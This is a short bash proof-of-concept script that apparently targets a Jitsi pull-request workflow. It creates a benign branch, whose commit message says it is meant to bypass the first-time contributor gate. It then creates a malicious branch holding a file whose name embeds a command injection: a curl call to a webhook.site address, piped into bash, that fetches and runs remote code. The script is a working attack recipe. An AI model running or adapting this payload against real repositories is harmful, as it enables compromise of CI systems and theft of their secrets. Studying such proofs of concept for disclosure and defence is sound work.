#!/bin/bash
echo "[*] Setting up Jitsi Command Injection PoC branches..."
git checkout main
echo "[*] Creating benign PR branch..."
git checkout -b benign-pr
echo '{ "test": "test" }' > lang/test.json
git add lang/test.json
git commit -m "Benign commit to bypass first-time contributor gate"

echo "[*] Creating malicious PR branch..."
git checkout main
git checkout -b malicious-pr
PAYLOAD='"; curl -s https://webhook.site/YOUR-UUID-HERE | bash; echo "'
touch "lang/$PAYLOAD"
git add "lang/$PAYLOAD"
git commit -m "Malicious commit with command injection payload"

git checkout main
echo "[*] Done! Branches created."
